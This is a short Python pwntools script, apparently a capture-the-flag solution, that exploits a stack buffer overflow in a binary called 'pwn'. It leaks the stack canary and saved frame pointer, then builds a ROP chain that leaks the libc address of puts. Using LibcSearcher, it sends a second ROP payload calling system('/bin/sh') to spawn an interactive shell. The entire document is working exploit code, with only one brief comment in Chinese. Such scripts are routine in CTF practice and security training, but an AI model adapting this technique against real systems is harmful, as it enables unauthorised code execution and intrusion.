from pwn import *
from LibcSearcher import *
context.log_level="debug"
elf=ELF("pwn")
p = remote("0.0.0.0", 33909)
#p = process("./pwn")
payload = b'a' * (0x50 - 8) + p8(0xcc)

p.sendafter("name", payload)
p.recvuntil("\xcc")
canary = p8(0) + p.recvn(7)
old_rbp=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(old_rbp))
print(canary)
main_addr = elf.sym['main']
vuln=0x00000000040121B
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x0000000000401343
ret=0x40101a

payload1 = b'a' * 0x48 + canary + p64(old_rbp+0x10) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
# 给puts函数传入puts的got 得到真实地址 再跳转回main函数便于再次溢出
p.sendlineafter("stack!", payload1)



puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
p.sendlineafter("name",b'1')
payload2 =b'a' * 0x48 + canary + p64(old_rbp)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(ret)+p64(system_addr)
p.sendlineafter("stack", payload2)

p.interactive()

